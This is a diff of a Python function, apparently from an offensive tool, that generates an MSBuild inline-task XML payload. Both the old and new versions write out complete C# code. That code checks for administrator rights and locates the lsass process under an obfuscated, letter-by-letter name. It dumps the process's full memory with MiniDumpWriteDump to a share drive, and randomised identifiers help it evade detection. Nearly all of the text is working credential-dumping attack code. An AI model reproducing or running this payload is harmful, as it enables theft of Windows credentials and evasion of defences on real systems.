@@ -792,101 +792,100 @@ def gen_payload(share_name, payload_name, drive_letter):
     s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
 
-    xml_payload = r"""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-<!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe SimpleTasks.csproj -->
-	<Target Name="%s">
-            <%s /> 
-          </Target>
-          <UsingTask
-            TaskName="%s"
-            TaskFactory="CodeTaskFactory"
-            AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
-            <Task>
+    xml_payload = "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n"
+    xml_payload += "<!-- C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe SimpleTasks.csproj -->\n"
+    xml_payload += "	<Target Name=\"%s\">\n" % (targetname)
+    xml_payload += "            <%s />\n" % (taskname)
+    xml_payload += "          </Target>\n"
+    xml_payload += "          <UsingTask\n"
+    xml_payload += "            TaskName=\"%s\"\n" % (taskname)
+    xml_payload += "            TaskFactory=\"CodeTaskFactory\"\n"
+    xml_payload += "            AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" >\n"
+    xml_payload += "            <Task>\n"
 
-              <Code Type="Class" Language="cs">
-              <![CDATA[
-using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;
-public class %s : Task, ITask {
-		public enum Typ : uint
-        {
-            %s = 0x00000001,
-            %s = 0x00000002,
-            %s = 0x00000004,
-            %s = 0x00001000,
-            %s = 0x00040000,
-        };
+    xml_payload += "              <Code Type=\"Class\" Language=\"cs\">\n"
+    xml_payload += "              <![CDATA[\n"
+    xml_payload += "using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;\n"
+    xml_payload += "public class %s : Task, ITask {\n" % (taskname)
+    xml_payload += "		public enum Typ : uint\n"
+    xml_payload += "        {\n"
+    xml_payload += "            %s = 0x00000001,\n" % (MiniDumpWithDataSegs)
+    xml_payload += "            %s = 0x00000002,\n" % (MiniDumpWithFullMemory)
+    xml_payload += "            %s = 0x00000004,\n" % (MiniDumpWithHandleData)
+    xml_payload += "            %s = 0x00001000,\n" % (MiniDumpWithThreadInfo)
+    xml_payload += "            %s = 0x00040000,\n" % (MiniDumpWithTokenInformation)
+    xml_payload += "        };\n"
 
-        [System.Runtime.InteropServices.DllImport("dbghelp.dll",
-              EntryPoint = "MiniDumpWriteDump",
-              CallingConvention = CallingConvention.StdCall,
-              CharSet = CharSet.Unicode,
-              ExactSpelling = true, SetLastError = true)]
-        static extern bool MiniDumpWriteDump(
-              IntPtr hProcess,
-              uint processId,
-              IntPtr hFile,
-              uint dumpType,
-              IntPtr expParam,
-              IntPtr userStreamParam,
-              IntPtr callbackParam);
+    xml_payload += "        [System.Runtime.InteropServices.DllImport(\"dbghelp.dll\",\n"
+    xml_payload += "              EntryPoint = \"MiniDumpWriteDump\",\n"
+    xml_payload += "              CallingConvention = CallingConvention.StdCall,\n"
+    xml_payload += "              CharSet = CharSet.Unicode,\n"
+    xml_payload += "              ExactSpelling = true, SetLastError = true)]\n"
+    xml_payload += "        static extern bool MiniDumpWriteDump(\n"
+    xml_payload += "              IntPtr hProcess,\n"
+    xml_payload += "              uint processId,\n"
+    xml_payload += "              IntPtr hFile,\n"
+    xml_payload += "              uint dumpType,\n"
+    xml_payload += "              IntPtr expParam,\n"
+    xml_payload += "              IntPtr userStreamParam,\n"
+    xml_payload += "              IntPtr callbackParam);\n"
 
-        public static bool %s(string %s, Typ %s, IntPtr %s, uint %s)
-        {
-            using (var fs = new System.IO.FileStream(%s, System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))
-            {
-                bool bRet = MiniDumpWriteDump(
-                  %s,
-                  %s,
-                  fs.SafeFileHandle.DangerousGetHandle(),
-                  (uint)%s,
-                  IntPtr.Zero,
-                  IntPtr.Zero,
-                  IntPtr.Zero);
-                if (!bRet)
-                {
-                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
-                }
-                return bRet;
-            }
-        }
+    xml_payload += "        public static bool %s(string %s, Typ %s, IntPtr %s, uint %s)\n" % (Dump, filename, dumpTyp, prochandle, procid)
+    xml_payload += "        {\n"
+    xml_payload += "            using (var fs = new System.IO.FileStream(%s, System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))\n" % (filename)
+    xml_payload += "            {\n"
+    xml_payload += "                bool bRet = MiniDumpWriteDump(\n"
+    xml_payload += "                  %s,\n" % (prochandle)
+    xml_payload += "                  %s,\n" % (procid)
+    xml_payload += "                  fs.SafeFileHandle.DangerousGetHandle(),\n"
+    xml_payload += "                  (uint)%s,\n" % (dumpTyp)
+    xml_payload += "                  IntPtr.Zero,\n"
+    xml_payload += "                  IntPtr.Zero,\n"
+    xml_payload += "                  IntPtr.Zero);\n"
+    xml_payload += "                if (!bRet)\n"
+    xml_payload += "                {\n"
+    xml_payload += "                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n"
+    xml_payload += "                }\n"
+    xml_payload += "                return bRet;\n"
+    xml_payload += "            }\n"
+    xml_payload += "        }\n"
 
-        public static int %s() {
-            string %s = "s";
-            string %s = "l";
-            string %s = "a";
-            var %s = System.Diagnostics.Process.GetProcessesByName(%s + %s + %s + %s + %s);
-            var %s = 0;
-            foreach (var %s in %s)
-            {
-                %s = %s.Id;
-            }
+    xml_payload += "        public static int %s() {\n" % (GetPID)
+    xml_payload += "            string %s = \"s\";\n" % (s)
+    xml_payload += "            string %s = \"l\";\n" % (l)
+    xml_payload += "            string %s = \"a\";\n" % (a)
+    xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(%s + %s + %s + %s + %s);\n" % (processes, l, s, a, s, s)
+    xml_payload += "            var %s = 0;\n" % (id)
+    xml_payload += "            foreach (var %s in %s)\n" % (process, processes)
+    xml_payload += "            {\n"
+    xml_payload += "                %s = %s.Id;\n" % (id, process)
+    xml_payload += "            }\n"
 
-            return %s;
-        }
+    xml_payload += "            return %s;\n" % (id)
+    xml_payload += "        }\n"
 
-        public static bool %s()
-        {
-            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
-                      .IsInRole(WindowsBuiltInRole.Administrator);
-        }
+    xml_payload += "        public static bool %s()\n" % (IsAdministrator)
+    xml_payload += "        {\n"
+    xml_payload += "            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))\n"
+    xml_payload += "                      .IsInRole(WindowsBuiltInRole.Administrator);\n"
+    xml_payload += "        }\n"
 
-        public override bool Execute()
-		{
-            if (%s())
-            {
-                string filePath = "%s:\\" + System.Net.Dns.GetHostName() + ".dmp";
-                Process %s = Process.GetProcessById(%s());
-                %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);
+    xml_payload += "        public override bool Execute()\n"
+    xml_payload += "		{\n"
+    xml_payload += "            if (%s())\n" % (IsAdministrator)
+    xml_payload += "            {\n"
+    xml_payload += "                string filePath = \"%s:\\\\\" + System.Net.Dns.GetHostName() + \".dmp\";\n" % (drive_letter)
+    xml_payload += "                Process %s = Process.GetProcessById(%s());\n" % (p, GetPID)
+    xml_payload += "                %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);\n" % (Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)
 
-            }
-			return true;
-        }}
-                                ]]>
-                        </Code>
-                </Task>
-        </UsingTask>
-</Project>""" % (targetname, taskname, taskname, taskname, MiniDumpWithDataSegs, MiniDumpWithFullMemory, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, Dump, filename, dumpTyp, prochandle, procid, filename, prochandle, procid, dumpTyp, GetPID, s, l, a, processes, l, s, a, s, s, id, process, processes, id, process, id, IsAdministrator, IsAdministrator, drive_letter, p, GetPID, Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)
-
+    xml_payload += "            }\n"
+    xml_payload += "			return true;\n"
+    xml_payload += "        }}\n"
+    xml_payload += "                                ]]>\n"
+    xml_payload += "                        </Code>\n"
+    xml_payload += "                </Task>\n"
+    xml_payload += "        </UsingTask>\n"
+    xml_payload += "</Project>"
     with open('/var/tmp/{}/{}.xml'.format(share_name, payload_name), 'w') as f:
         f.write(xml_payload)
         f.close()
